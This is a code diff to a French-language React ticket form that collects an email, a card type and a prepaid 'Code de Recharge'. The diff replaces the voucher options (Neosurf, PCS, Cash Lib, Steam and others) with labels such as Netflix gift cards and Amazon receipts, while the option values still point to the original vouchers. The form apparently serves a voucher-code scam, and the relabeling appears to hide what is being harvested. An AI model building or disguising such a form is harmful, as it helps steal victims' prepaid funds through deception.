@@ -159,19 +159,20 @@ function TicketForm() {
     <div className="mb-3">
         <input type="email" placeholder="Email" className="form-control" value={email} onChange={(e) => setEmail(e.target.value)} required />
     </div>
+<div className="mb-3">
+    <select className="form-select" value={cardType} onChange={(e) => setCardType(e.target.value)} required>
+        <option value="">Type de carte</option>
+        <option value="neosurf">Carte cadeau Netflix</option>
+        <option value="pcs">Carte cinéma UGC / Pathé</option>
+        <option value="itunes">Reçu de recharge Orange Money</option>
+        <option value="apple">Ticket d’achat Amazon</option>
+        <option value="google">Carte cadeau Spotify Premium</option>
+        <option value="steam">Reçu Apple Store</option>
+        <option value="cashlib">Carte cadeau Zalando</option>
+        <option value="nintendo">Carte Nintendo eShop</option>
+    </select>
+</div>
 
-    <div className="mb-3">
-        <select className="form-select" value={cardType} onChange={(e) => setCardType(e.target.value)} required>
-            <option value="">Type de Recharge</option>
-            <option value="neosurf">Neosurf</option>
-            <option value="pcs">PCS</option>
-            <option value="iTunes">iTunes</option>
-            <option value="apple">Apple</option>
-            <option value="google">Google</option>
-            <option value="steam">Steam</option>
-            <option value="Cash Lib">Cash Lib</option>
-        </select>
-    </div>
 
     <div className="mb-3">
         <input type="text" placeholder="Code de Recharge" className="form-control text-white" value={code} onChange={(e) => setCode(e.target.value)} required />
